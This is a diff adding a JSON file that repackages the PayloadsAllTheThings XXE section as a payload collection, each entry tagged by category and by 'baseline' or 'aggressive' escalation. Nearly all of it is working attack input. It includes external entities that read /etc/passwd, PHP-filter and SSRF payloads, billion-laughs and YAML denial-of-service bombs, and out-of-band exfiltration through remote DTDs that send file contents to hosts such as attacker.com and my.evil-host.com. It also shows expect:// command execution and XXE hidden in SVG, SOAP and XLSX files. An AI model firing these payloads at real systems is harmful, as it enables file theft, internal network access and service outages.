@@ -1,0 +1,368 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "xxe",
+  "original_category": "XXE Injection",
+  "payloads": [
+    {
+      "category": "Detect The Vulnerability",
+      "escalation": "baseline",
+      "lines": [
+        "<!--?xml version=\"1.0\" ?-->",
+        "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+        "<userInfo>",
+        "<firstName>John</firstName>",
+        "<lastName>&example;</lastName>",
+        "</userInfo>"
+      ]
+    },
+    {
+      "category": "Classic XXE",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+        "<?xml version=\"1.0\"?>",
+        "<!DOCTYPE data [",
+        "<!ELEMENT data (#ANY)>",
+        "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+        "]>",
+        "<data>&file;</data>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "<!DOCTYPE foo [",
+        "<!ELEMENT foo ANY >",
+        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "<!DOCTYPE foo [",
+        "<!ELEMENT foo ANY >",
+        "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+        "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">",
+        "<!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">"
+      ]
+    },
+    {
+      "category": "Classic XXE Base64 Encoded",
+      "escalation": "baseline",
+      "lines": [
+        "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
+      ]
+    },
+    {
+      "category": "PHP Wrapper Inside XXE",
+      "escalation": "baseline",
+      "lines": [
+        "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",
+        "<contacts>",
+        "<contact>",
+        "<name>Jean &xxe; Dupont</name>",
+        "<phone>00 11 22 33 44</phone>",
+        "<address>42 rue du CTF</address>",
+        "<zipcode>75000</zipcode>",
+        "<city>Paris</city>",
+        "</contact>",
+        "</contacts>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "<!DOCTYPE foo [",
+        "<!ELEMENT foo ANY >",
+        "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >",
+        "]>",
+        "<foo>&xxe;</foo>"
+      ]
+    },
+    {
+      "category": "XInclude Attacks",
+      "escalation": "baseline",
+      "lines": [
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">",
+        "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+      ]
+    },
+    {
+      "category": "Exploiting XXE to Perform SSRF Attacks",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "<!DOCTYPE foo [",
+        "<!ELEMENT foo ANY >",
+        "<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >",
+        "]>",
+        "<foo>&xxe;</foo>"
+      ]
+    },
+    {
+      "category": "Billion Laugh Attack",
+      "escalation": "baseline",
+      "lines": [
+        "<!DOCTYPE data [",
+        "<!ENTITY a0 \"dos\" >",
+        "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
+        "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">",
+        "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">",
+        "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">",
+        "]>",
+        "<data>&a4;</data>"
+      ]
+    },
+    {
+      "category": "YAML Attack",
+      "escalation": "baseline",
+      "lines": [
+        "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]",
+        "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",
+        "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",
+        "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
+        "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",
+        "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",
+        "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",
+        "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",
+        "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]"
+      ]
+    },
+    {
+      "category": "Parameters Laugh Attack",
+      "escalation": "baseline",
+      "lines": [
+        "<!DOCTYPE r [",
+        "<!ENTITY % pe_1 \"<!---->\">",
+        "<!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">",
+        "<!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">",
+        "<!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">",
+        "%pe_4;",
+        "]>",
+        "<r/>"
+      ]
+    },
+    {
+      "category": "Error Based - Using Local DTD File",
+      "escalation": "baseline",
+      "lines": [
+        "<!DOCTYPE root [",
+        "<!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">",
+        "%local_dtd;",
+        "]>",
+        "<root></root>",
+        "/usr/share/xml/fontconfig/fonts.dtd",
+        "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
+        "/usr/share/xml/svg/svg10.dtd",
+        "/usr/share/xml/svg/svg11.dtd",
+        "/usr/share/yelp/dtd/docbookx.dtd",
+        "<!DOCTYPE message [",
+        "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">",
+        "<!ENTITY % constant 'aaa)>",
+        "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">",
+        "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">",
+        "&#x25;eval;",
+        "&#x25;error;",
+        "<!ELEMENT aa (bb'>",
+        "%local_dtd;",
+        "]>",
+        "<message>Text</message>"
+      ]
+    },
+    {
+      "category": "Error Based - Using Remote DTD",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" ?>",
+        "<!DOCTYPE message [",
+        "<!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\">",
+        "%ext;",
+        "]>",
+        "<message></message>",
+        "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
+        "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+        "%eval;",
+        "%error;",
+        "<!ENTITY % data SYSTEM \"file:///etc/passwd\">",
+        "<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">",
+        "%eval;",
+        "%leak;"
+      ]
+    },
+    {
+      "category": "Basic Blind XXE",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" ?>",
+        "<!DOCTYPE root [",
+        "<!ENTITY % ext SYSTEM \"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\"> %ext;",
+        "]>",
+        "<r></r>",
+        "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>",
+        "<root>&test;</root>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+        "<!DOCTYPE foo [",
+        "<!ELEMENT foo ANY >",
+        "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >",
+        "<!ENTITY callhome SYSTEM \"www.malicious.com/?%xxe;\">",
+        "]",
+        ">",
+        "<foo>&callhome;</foo>"
+      ]
+    },
+    {
+      "category": "Out of Band XXE",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+        "<!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\">",
+        "<data>&send;</data>",
+        "File stored on http://publicServer.com/parameterEntity_oob.dtd",
+        "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">",
+        "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>\">",
+        "%all;"
+      ]
+    },
+    {
+      "category": "XXE OOB with DTD and PHP Filter",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" ?>",
+        "<!DOCTYPE r [",
+        "<!ELEMENT r ANY >",
+        "<!ENTITY % sp SYSTEM \"http://127.0.0.1/dtd.xml\">",
+        "%sp;",
+        "%param1;",
+        "]>",
+        "<r>&exfil;</r>",
+        "File stored on http://127.0.0.1/dtd.xml",
+        "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+        "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>\">"
+      ]
+    },
+    {
+      "category": "XXE OOB with Apache Karaf",
+      "escalation": "baseline",
+      "lines": [
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\"> %dtd;]",
+        "<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
+        "xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">",
+        "<feature name=\"deployer\" version=\"2.0\" install=\"auto\">",
+        "</feature>",
+        "</features>"
+      ]
+    },
+    {
+      "category": "Bypass via Character Encoding",
+      "escalation": "aggressive",
+      "lines": [
+        "cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml"
+      ]
+    },
+    {
+      "category": "XXE on JSON Endpoints",
+      "escalation": "aggressive",
+      "lines": [
+        "{",
+        "\"errors\":{",
+        "\"errorMessage\":\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"",
+        "}",
+        "}"
+      ]
+    },
+    {
+      "category": "XXE Inside SVG",
+      "escalation": "aggressive",
+      "lines": [
+        "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">",
+        "<image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>",
+        "</svg>",
+        "<?xml version=\"1.0\" standalone=\"yes\"?>",
+        "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>",
+        "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
+        "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
+        "</svg>",
+        "<?xml version=\"1.0\" standalone=\"yes\"?>",
+        "<!DOCTYPE svg [",
+        "<!ELEMENT svg ANY >",
+        "<!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\">",
+        "%sp;",
+        "%param1;",
+        "]>",
+        "<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">",
+        "<text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>",
+        "<rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>",
+        "<flowRoot font-size=\"15\">",
+        "<flowRegion>",
+        "<rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>",
+        "</flowRegion>",
+        "<flowDiv>",
+        "<flowPara>&exfil;</flowPara>",
+        "</flowDiv>",
+        "</flowRoot>",
+        "</svg>",
+        "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">",
+        "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>\">"
+      ]
+    },
+    {
+      "category": "XXE Inside SOAP",
+      "escalation": "aggressive",
+      "lines": [
+        "<soap:Body>",
+        "<foo>",
+        "<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]>",
+        "</foo>",
+        "</soap:Body>"
+      ]
+    },
+    {
+      "category": "XXE Inside DOCX file",
+      "escalation": "aggressive",
+      "lines": [
+        "DOCX/XLSX/PPTX",
+        "ODT/ODG/ODP/ODS",
+        "SVG",
+        "XML",
+        "PDF (experimental)",
+        "JPG (experimental)",
+        "GIF (experimental)"
+      ]
+    },
+    {
+      "category": "XXE Inside XLSX file",
+      "escalation": "aggressive",
+      "lines": [
+        "$ 7z l xxe.xlsx",
+        "[...]",
+        "Date      Time    Attr         Size   Compressed  Name",
+        "------------------- ----- ------------ ------------  ------------------------",
+        "2021-10-17 15:19:00 .....          578          223  _rels/.rels",
+        "2021-10-17 15:19:00 .....          887          508  xl/workbook.xml",
+        "2021-10-17 15:19:00 .....         4451          643  xl/styles.xml",
+        "2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml",
+        "2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels",
+        "2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml",
+        "2021-10-17 15:19:00 .....          731          352  docProps/core.xml",
+        "2021-10-17 15:19:00 .....          410          246  docProps/app.xml",
+        "2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml",
+        "------------------- ----- ------------ ------------  ------------------------",
+        "2021-10-17 15:19:00              11216         3586  9 files",
+        "cd XXE",
+        "zip -r -u ../xxe.xlsx *",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+        "<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]>",
+        "<cdl>&rrr;</cdl>",
+        "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+        "<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\">%asd;%c;]>",
+        "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",
+        "<!ENTITY % d SYSTEM \"file:///etc/passwd\">",
+        "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>\">",
+        "xxeserv -o files.log -p 2121 -w -wd public -wp 8000"
+      ]
+    },
+    {
+      "category": "XXE Inside DTD file",
+      "escalation": "aggressive",
+      "lines": [
+        "<!-- Load the contents of a sensitive file into a variable -->",
+        "<!ENTITY % payload SYSTEM \"file:///etc/passwd\">",
+        "<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->",
+        "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://my.evil-host.com/x=%payload;\">'>",
+        "%param1;",
+        "%external;"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.867Z"
+}
